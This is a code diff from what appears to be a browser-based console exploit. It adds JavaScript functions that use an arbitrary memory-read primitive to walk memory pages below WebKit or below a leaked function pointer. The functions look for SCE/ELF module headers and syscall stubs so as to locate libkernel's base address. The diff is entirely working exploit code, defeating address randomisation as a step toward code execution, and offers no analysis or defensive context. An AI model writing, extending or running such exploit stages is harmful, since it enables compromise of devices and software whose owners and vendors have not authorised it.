@@ -2165,21 +2165,96 @@ function findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxPages) {
 }
 
 /**
- * Dump-free module hunt — ≤12 header pages + ≤10 stub samples. No fnPtr code read.
+ * Ext fn ptr → SCE/ELF header walk + lite stub score. Returns hit or diag.
  */
-export function resolveExtModuleHunt(p, fnPtr, webkitBase, off, maxPages) {
-    if (!fnPtr || fnPtr.hi < 0x8) return null;
+export function resolveExtModuleHuntDiag(p, fnPtr, webkitBase, off, maxPages) {
+    if (!fnPtr || fnPtr.hi < 0x8)
+        return { hit: null, walked: 0, hdr: false };
     maxPages = maxPages != null ? Math.min(maxPages, 16) : 12;
 
-    const hdr = findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxPages);
-    if (!hdr) return null;
+    let page = pageAlignDown(fnPtr, 0x4000);
+    if (page.hi >= 0x8) page = page.sub32(0x4000);
+    let nullStreak = 0;
+    let walked = 0;
+    let hdr = null;
+    for (let i = 0; i < maxPages; i++) {
+        walked++;
+        if (!page || !plausibleLkBeforeRead(page, fnPtr, webkitBase, off)) break;
+        const magic = read4p(p, page);
+        if (magic == null) {
+            nullStreak++;
+            if (nullStreak >= 6) break;
+            page = page.sub32(0x4000);
+            continue;
+        }
+        nullStreak = 0;
+        if (isModuleMagic(magic) && !isSameWebkitModule(page, webkitBase, off)) {
+            hdr = page;
+            break;
+        }
+        page = page.sub32(0x4000);
+    }
+
+    if (!hdr)
+        return { hit: null, walked, hdr: false };
 
     const stubs = liteSyscallStubScore(p, hdr);
     if (stubs >= 2)
-        return { lk: hdr, via: "mod-hunt", stubs, fnPtr };
+        return { hit: { lk: hdr, via: "mod-hunt", stubs, fnPtr }, walked, hdr: true, stubs };
     if (stubs >= 1 && checkPrologueAt(p, hdr))
-        return { lk: hdr, via: "mod-hunt-weak", stubs, fnPtr, weak: true };
-    return null;
+        return { hit: { lk: hdr, via: "mod-hunt-weak", stubs, fnPtr, weak: true }, walked, hdr: true, stubs };
+    return { hit: null, walked, hdr: true, stubs: stubs };
+}
+
+export function resolveExtModuleHunt(p, fnPtr, webkitBase, off, maxPages) {
+    const d = resolveExtModuleHuntDiag(p, fnPtr, webkitBase, off, maxPages);
+    return d.hit || null;
+}
+
+/** Chunked scan below webkit for SCE + syscall stubs (no ext ptr, no dump). */
+export function huntLibkernelBelowWebkit(p, webkitBase, off, pageOffset, batchPages) {
+    if (!p || !webkitBase) return { miss: true, error: "no webkitBase" };
+    pageOffset = pageOffset != null ? pageOffset : 0;
+    batchPages = batchPages != null ? batchPages : 8;
+    const step = 0x4000n;
+    const wb = ptrBig(webkitBase) & ~0x3fffn;
+    const lo = wb - BigInt((pageOffset + batchPages)) * step;
+    const hi = wb - BigInt(pageOffset) * step;
+    let cursor = lo;
+    let scanned = 0;
+    let best = null;
+
+    while (cursor < hi && scanned < batchPages) {
+        const addr = bigToPtr(cursor);
+        cursor += step;
+        scanned++;
+        if (!addr || addr.hi < 0x8 || (addr.low & 0x3fff) !== 0) continue;
+        const magic = read4p(p, addr);
+        if (magic == null) continue;
+        if (isModuleMagic(magic) && !isSameWebkitModule(addr, webkitBase, off)) {
+            const stubs = liteSyscallStubScore(p, addr);
+            if (stubs >= 2)
+                return { lk: addr, via: "below-wk+sce", stubs, offset: pageOffset + scanned };
+            if (!best || stubs > best.stubs)
+                best = { lk: addr, via: "below-wk+sce", stubs, offset: pageOffset + scanned };
+        }
+        if (checkPrologueAt(p, addr)) {
+            const stubs = liteSyscallStubScore(p, addr);
+            if (stubs >= 2)
+                return { lk: addr, via: "below-wk+pro", stubs, offset: pageOffset + scanned };
+            if (!best || stubs > best.stubs)
+                best = { lk: addr, via: "below-wk+pro", stubs, offset: pageOffset + scanned };
+        }
+    }
+
+    if (best && best.stubs >= 1)
+        return Object.assign({ weak: true }, best);
+    return {
+        miss: true,
+        offset: pageOffset + batchPages,
+        scanned,
+        bestStubs: best ? best.stubs : 0,
+    };
 }
 
 function addrFromNum(n) {
